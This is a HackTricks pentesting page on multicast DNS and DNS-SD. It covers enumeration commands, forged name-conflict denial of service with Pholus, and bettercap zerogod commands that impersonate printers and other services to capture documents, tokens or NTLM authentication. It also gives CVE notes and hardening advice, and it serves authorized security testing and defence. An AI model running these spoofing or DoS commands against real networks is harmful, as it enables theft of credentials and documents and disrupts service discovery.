---
title: "5353/UDP Multicast DNS (mDNS) and DNS-SD"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/5353-udp-multicast-dns-mdns.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## Basic Information

Multicast DNS (mDNS) provides DNS-like name resolution on a local link without a conventional unicast DNS server. It uses UDP/5353 and the multicast addresses `224.0.0.251` (IPv4) and `FF02::FB` (IPv6). DNS Service Discovery (DNS-SD), commonly carried over mDNS, describes service types and instances using PTR, SRV, TXT, A, and AAAA records.[\[1\]](#references)[\[7\]](#references)[\[8\]](#references)

```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Key protocol details relevant to an assessment:[\[7\]](#references)

- Names in the `.local.` zone are resolved through mDNS.
- The QU (query-unicast) bit can request a unicast reply to a multicast question.
- An mDNS responder must silently discard IPv4 packets whose source is not on the local subnet; for IPv6, it must discard sources other than the local link unless configured as a proxy. Gateways and reflectors intentionally alter this boundary.
- Probing and announcement establish unique host and service names. Forged conflicts can therefore create denial of service or force a device to choose a different name.

## DNS-SD service model

Services use names such as `_<service>._tcp.local.` or `_<service>._udp.local.`. Examples include `_ipp._tcp.local.` (printing), `_airplay._tcp.local.` (AirPlay), and `_adb._tcp.local.` (Android Debug Bridge). Query `_services._dns-sd._udp.local.` to enumerate service types, then resolve instance PTR targets and their SRV/TXT/A/AAAA records.[\[8\]](#references)

## Network Exploration and Enumeration

- nmap target scan (direct mDNS on a host):
```
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- nmap broadcast discovery (listen to the segment and enumerate all DNS-SD types/instances):<sup>[\[2\]](#references)</sup>```
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS):
```
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Packet capture with tshark:
```
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Tip: Some WebRTC implementations replace host IP addresses in ICE candidates with temporary mDNS names. A compatible peer resolves those names during ICE processing. If such a candidate appears in authorized signaling or a capture, test its resolution from the same link, but do not assume that every random `.local` name is a stable device hostname or is resolvable outside the browser’s lifetime and privacy scope.[\[14\]](#references)

## [Attacks](#attacks)

### [mDNS name probing interference (DoS / name squatting)](#mdns-name-probing-interference-dos--name-squatting)

During the probing phase, a host checks name uniqueness. Responding with forged conflicts can force it to pick new names or fail, delaying or preventing service registration and discovery. This is disruptive active testing and should be confined to an authorized lab or maintenance window.[\[1\]](#references)[\[7\]](#references)

Example using the legacy Python 3 port included in the Pholus repository (confirm the flags against the checked-out revision):[\[9\]](#references)

```
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### [Service spoofing and impersonation (MitM)](#service-spoofing-and-impersonation-mitm)

In an authorized lab, impersonate advertised DNS-SD services (printers, AirPlay, HTTP, or file shares) to test whether clients authenticate or transmit sensitive content before validating the service. This can:

- Capture documents by spoofing `_ipp._tcp` or`_printer._tcp` .
- Lure clients to HTTP/HTTPS services to harvest tokens/cookies or deliver payloads.
- Capture or relay Windows authentication when a client negotiates NTLM to the spoofed service and the separate relay prerequisites are met.

With bettercap’s zerogod module (mDNS/DNS-SD spoofer/impersonator):[\[3\]](#references)

```
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"
# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42
# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42
# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42
# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Also see generic LLMNR/NBNS/mDNS/WPAD spoofing and credential capture/relay workflows:

[Spoofing LLMNR, NBT-NS, mDNS/DNS and WPAD and Relay Attacks](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html)

### [Notes on implementation vulnerabilities](#notes-on-implementation-vulnerabilities)

- Avahi reachable-assertion bugs CVE-2023-38469 through CVE-2023-38473 and the D-Bus-related CVE-2023-1981 can terminate `avahi-daemon` on affected distributions, disrupting service discovery until it restarts. The exact vectors differ; install the distribution’s fixed Avahi package rather than treating the identifiers as one network exploit.<sup>[\[12\]](#references)</sup>
- Cisco IOS XE Wireless LAN Controller mDNS gateway CVE-2024-20303 allows an unauthenticated adjacent WLAN attacker to send a sustained stream of crafted mDNS traffic, drive controller CPU high, and potentially disconnect AP tunnels. It is a disruptive DoS condition, not a general-purpose roaming primitive.<sup>[\[4\]](#references)</sup>
- Apple mDNSResponder CVE-2024-44183 allowed a local app to cause denial of service. Apple addressed the logic error in iOS/iPadOS 18; consult the matching advisory for other Apple platform releases.<sup>[\[5\]](#references)[\[15\]](#references)</sup>
- Apple mDNSResponder CVE-2025-31222 was a local privilege-escalation correctness issue fixed in macOS Sequoia 15.5. Apple’s advisory describes a local user impact; it is not a remote mDNS network exploit and the cited macOS advisory does not establish iPhone impact.<sup>[\[6\]](#references)[\[13\]](#references)</sup>

### [Browser/WebRTC mDNS considerations](#browserwebrtc-mdns-considerations)

Modern browsers may obfuscate WebRTC host candidates with random mDNS names. On managed Chrome or Edge endpoints, `WebRtcLocalIpsAllowedUrls` permits listed origins to receive local IP addresses in ICE candidates instead. This is a per-origin compatibility policy—not a general mDNS switch—and weakens privacy for the allowed origins. The corresponding `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns` experiment has existed, but flags are version-dependent and should not be used as durable enterprise configuration.[\[10\]](#references)

On managed Windows Chrome installations, the policy is stored below `HKLM\Software\Policies\Google\Chrome\WebRtcLocalIpsAllowedUrls`, with allowlisted origins represented as numbered string values. Edge uses its own vendor policy path. Prefer the browser’s policy UI or enterprise management tooling over editing the registry manually, and verify the effective policy after deployment.[\[10\]](#references)[\[17\]](#references)

When that protection is disabled, permitted web applications may receive plain host candidates through ICE signaling. Those IP candidates are not “captured via mDNS”; they replace the obfuscated mDNS names in the WebRTC candidate data.[\[10\]](#references)

## [Defensive considerations and OPSEC](#defensive-considerations-and-opsec)

- Segment boundaries: Don’t route 224.0.0.251/FF02::FB between security zones unless an mDNS gateway is explicitly required. If you must bridge discovery, prefer allowlists and rate limits.
- Windows endpoints/servers:
  - A widely used legacy DNS Client setting is the following value followed by a reboot:
 This affects the Windows DNS Client implementation, not necessarily Bonjour or another application’s own responder. Verify the resulting traffic on the exact Windows build.```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
  - In managed environments, disable the built-in “mDNS (UDP-In)” Windows Defender Firewall rule (at least on the Domain profile) to prevent inbound mDNS processing while preserving home/roaming functionality.
  - Where the installed ADMX templates expose it, set **Computer Configuration → Administrative Templates → Network → DNS Client → Configure multicast DNS (mDNS) protocol** to**Disabled** . The policy-backed value is`HKLM\Software\Policies\Microsoft\Windows NT\DNSClient\EnableMDNS` ; do not confuse this with the older`EnableMulticast` value used for LLMNR.<sup>[\[16\]](#references)</sup>
- A widely used legacy DNS Client setting is the following value followed by a reboot:
- Linux (Avahi):
  - Lock down publishing when not needed with `disable-publishing=yes` , and restrict interfaces using`allow-interfaces=` or`deny-interfaces=` in`/etc/avahi/avahi-daemon.conf` .
  - Consider `check-response-ttl=yes` . Avoid`enable-reflector=yes` unless required, and use`reflect-filters=` allowlists when reflecting. Note that the Avahi man page warns that enabling both reflection and wide-area DNS may create a security risk.<sup>[\[11\]](#references)</sup>
- Lock down publishing when not needed with
- macOS: Restrict inbound mDNS at host/network firewalls when Bonjour discovery is not needed for specific subnets.
- Monitoring: Alert on unusual surges in `_services._dns-sd._udp.local` queries or sudden changes in SRV/TXT of critical services; these are indicators of spoofing or service impersonation.

## Tooling quick reference

- nmap NSE: `dns-service-discovery` and`broadcast-dns-service-discovery` .
- Pholus: legacy active-scan, reverse-mDNS, DoS, and spoofing helpers. The upstream repository is old; run it only in an isolated authorized environment and validate its dependencies and command-line syntax.<sup>[\[9\]](#references)</sup>```
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: discover, save, advertise, and impersonate mDNS/DNS-SD services (see examples above).

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
